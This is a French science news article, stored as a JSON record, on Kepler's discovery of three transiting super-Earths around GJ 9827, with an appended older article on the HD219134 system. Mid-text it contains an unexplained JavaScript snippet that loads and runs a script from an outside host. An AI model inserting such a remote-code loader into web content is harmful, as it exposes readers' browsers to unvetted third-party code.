{"title": "Decouverte de 3 superterres en transit proches du Soleil", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-09-13", "content": "Kepler vient de denicher trois superterres situees autour d'une etoile un peu moins grande et moins massive que le Soleil. Sur les milliers d'exoplanetes debusquees par le satellite, ce sont les plus proches de nous, et aussi, probablement, les plus interessantes... Ce qu'il faut retenir Kepler a decouvert trois planetes en transit devant leur etoile. Ce sont les plus proches de notre Systeme solaire detectees par le satellite depuis le debut de sa carriere. Leur transit devant leur soleil permettra aux astronomes de caracteriser leur atmosphere et de detecter d'eventuelles traces de vie. Le satellite  Kepler , plus grand chasseur d'exoplanetes a ce jour, a qui l'on doit deja la decouverte de plus de 2.300 mondes nouveaux autour d'etoiles de la Galaxie (pres de 4.500 autres sont en attente de confirmation !) vient de debusquer trois  superterres  autour d'un  soleil  situe a seulement... 98  annees-lumiere . Ces exoplanetes ont ete detectees dans le cadre d'une campagne d'observation d'etoiles voisines de la  mission K2 . Elles sont les plus proches jamais identifiees par Kepler depuis ses debuts et elles pourraient etre parmi les plus importantes de son butin, de par leur relative proximite avec la  Terre ... Voir aussi : Kepler decouvre plus de 200 nouvelles exoplanetes dont 10 habitables En effet, pour esperer discerner d'eventuelles biosignatures sur des planetes au-dela de notre Systeme solaire, et aussi, bien sur, mieux les comprendre, il est preferable que les candidates ne soient pas trop eloignees et qu'elles passent devant leur  etoile  ( transit ). C'est le cas de chacune des trois planetes de ce systeme vu depuis la banlieue terrestre. <<  [GJ 9827]  est l'une des meilleures cibles pour la caracterisation atmospherique car elle est relativement brillante , a explique a IFLScience l'auteur principal de ces recherches en attente de publication (disponibles sur  Arxiv ), Prajwal Niraula, de la  Wesleyan University  (Connecticut, Etats-Unis).  C'est dans les cinq meilleurs candidats, selon nos calculs >> . Dans le cadre de la mission K2, Kepler recherche des planetes en transit devant leur etoile dans le plan de l'ecliptique. (c) Nasa Ames, W. Stenzel                               Trois planetes a la limite entre rocheuses et gazeuses De par leurs tailles, GJ 9827 b, c et d (respectivement 1,75 fois le rayon de la Terre, 1,36 fois et 2,1 fois) sont des  superterres . Certaines sont meme a la limite entre planetes rocheuses et planetes gazeuses. L'equipe estime qu'elles doivent etre enrobees d'une atmosphere. Et, donc, quoi de mieux que des transits pour analyser leur composition. La lumiere de l'etoile (environ 70 % de la  masse  du Soleil) retroeclaire en effet leurs enveloppes gazeuses.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Des superterres par milliards : une interview de Xavier Delfosse Certes, ce ne sera pas la premiere fois que les  atmospheres  d'exoplanetes seront etudiees -- Hubble en a deja plusieurs a son actif --, mais cela n'a encore jamais ete le cas avec des planetes de cette categorie et aussi proches de nous. Elles constituent d'excellentes candidates pour etre sondees par le futur et tres attendu JWST ( James Webb Space Telescope ), dont le lancement est prevu dans un an. Dans ce cas present, les trois superterres ne sont vraisemblablement pas  habitables  car trop proches de leur soleil. Leur periode de revolution se compte en jours : 1,2 pour GJ 9827 b, qui est la plus proche, 3,6 pour GJ 9827 c et 6,2 pour GJ 9827 d. Elles apparaissent en resonance 1:3:5. Pour en savoir plus Une superterre en transit a 21 annees-lumiere de la Terre Article de Laurent Sacco publie le 3 aout 2015 Il suffit de jeter un coup d' oeil  en direction de la  constellation  de Cassiopee pour pouvoir observer l'etoile HD219134, encore appelee Gliese 892. Autour d'elle viennent d'etre decouvertes trois superterres, dont l'une au moins effectue un transit planetaire. Il s'agit du plus proche systeme possedant une telle superterre. L'astronome allemand Wilhelm Gliese crea a partir de 1969 un celebre catalogue d'etoiles contenant des  astres  situes a moins de 25  parsecs  du Soleil, c'est-a-dire moins de 82 annees-lumiere environ. L'une de ces etoiles fait beaucoup parler d'elle en ce moment : Gliese 892. Elle est egalement connue sous la denomination de HD219134 dans le catalogue Henry Draper (HD) -- qui regroupe des donnees astrometriques et photometriques sur plus de 225.000 etoiles. L'etoile HD219134 est une  naine orange  dont la taille correspond a 80 % de celle du Soleil et la  luminosite  a 21 %. Situee a environ 21,3 annees-lumiere de la Terre, elle est visible a l'oeil nu, avec une  magnitude apparente  5,57 dans la constellation de Cassiopee, a faible distance (angulaire) du tres reconnaissable << W >>. Si l'on en croit un article depose sur  arXiv  par des astronomes de l'universite de Geneve (UNIGE), il suffit de jeter un  regard  de ce cote pour avoir sous les yeux cette etoile autour de laquelle tourne la plus proche  exoplanete  rocheuse connue a ce jour : HD219134b. La superterre decouverte serait en orbite autour de la naine orange Gliese 892. La planete, representee ici par une vue d'artiste, est tres proche de son etoile et la temperature a sa surface doit y etre assez elevee bien que Gliese 892 soit moins lumineuse que le Soleil. (c) Unige                               En fait, Gliese 892 est une etoile particulierement interessante parce qu'elle possede un systeme planetaire contenant non pas une mais trois  superterres  ainsi qu'une  geante gazeuse . La detection de ces exoplanetes s'est d'abord faite grace a la  methode des vitesses radiales . A elle seule, cette  methode  ne permet que de determiner la  periode orbitale  et une masse minimale pour une exoplanete (elle permet bien sur aussi de decouvrir son existence). Les astronomes se sont donc rapidement rendu compte que HD219134b bouclait une  orbite  autour de son etoile en seulement trois jours et qu'il pouvait s'agir d'une superterre. Cette decouverte est a porter au credit du  spectrographe   Harps-N  (acronyme de  High Accuracy Radial velocity Planet Searcher for the Northern hemisphere , soit en francais << Chercheur de planetes grace aux vitesses radiales a haute precision pour l' hemisphere nord  >>). Installe au  Telescopio Nazionale  Galileo ,  telescope  italien de 3,58 metres situe a l'observatoire de Roque de los Muchachos, sur l'ile de La Palma dans les Canaries, Harps-N est un cousin du fameux Harps installe dans l' hemisphere sud , au telescope de 3,6 metres de l' ESO , au Chili. HD219134b, une superterre de densite terrestre Pour lever le doute quant a la masse de HD219134b, il fallait pouvoir observer un transit planetaire car l'incertitude sur la masse fournie par la methode des vitesses radiales  porte  sur l'angle d'inclinaison de l'exoplanete par rapport a son etoile pour un observateur. L'observation d'un transit planetaire fournissant en plus le rayon de l' exoplanete , on peut en deduire sa densite et donc verifier que l'on est bien en presence d'une  planete rocheuse  et pas d'une  planete ocean  ou encore d'une geante gazeuse. La constellation de Cassiopee, avec son W, est facilement reperable sur la voute celeste. L'etoile HD219134, encore appelee Gliese 892, est visible a l'oeil nu dans le cercle a droite. (c) Unige                               Avec une periode orbitale de trois jours seulement, il devenait possible de demander du temps d'observation au celebre telescope  Spitzer  de la Nasa. C'est ainsi que les chercheurs ont pu determiner que HD219134b etait une planete 4,5 fois plus massive que la Terre, avec un diametre 1,6 fois plus grand. Il s'agit donc d'une superterre, selon la definition adoptee par les chasseurs d'exoplanetes qui utilisent Kepler (selon leur nomenclature, cette denomination caracterise les exoplanetes dont le rayon est compris entre 1,25 et 2 fois celui de la Terre). Au final, il apparait que Harps-N a egalement detecte deux autres superterres, une de 2,7 masses terrestres orbitant en 6,7 jours et une troisieme de 8,7 masses terrestres orbitant en 46,8 jours. Les chercheurs vont tenter de determiner leur rayon en essayant de surprendre, la aussi, un transit planetaire. Quant a la  geante gazeuse  egalement detectee, elle boucle une orbite autour de Gliese 892 en un peu plus de trois ans et il semble qu'elle soit dans la classe des << minisaturnes >>. Ce systeme planetaire est une mine d'or potentielle pour la planetologie comparee, l'etude de la formation des exoplanetes et, bien sur, l' exobiologie . Comme ce syseme est situe a seulement 21 annees-lumiere de la Terre, la prochaine generation de telescopes, comme l'E-ELT ( European Extremely Large Telescope ), devrait facilement etre en mesure d'imager la geante. Il devrait meme etre possible d'analyser en partie la composition chimique des atmospheres des superterres. Connaitre les densites de ces exoplanetes donnerait des contraintes cosmochimiques et  physiques  precieuses pour les modeles de formation planetaire dans les disques autour des jeunes etoiles. Interview : qu'est-ce qu'une exoplanete ?                       La question des exoplanetes est tres ancienne en astronomie. Leur existence est pour la premiere fois attestee de facon indirecte dans les annees 1990. Futura-Sciences a rencontre Jean-Pierre Luminet, astrophysicien de renom, afin qu'il nous parle plus en detail de ce passionnant sujet.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  definition du transit  |  transit de venus  |  transit baryte  |  transit planetaire  |  centre de transit  |  mer plus proche alsace  |  galaxie plus proche  |  etoile plus proche terre  |  plus proche voisin matlab  |  comment preparer mort proche", "theme": "sciences"}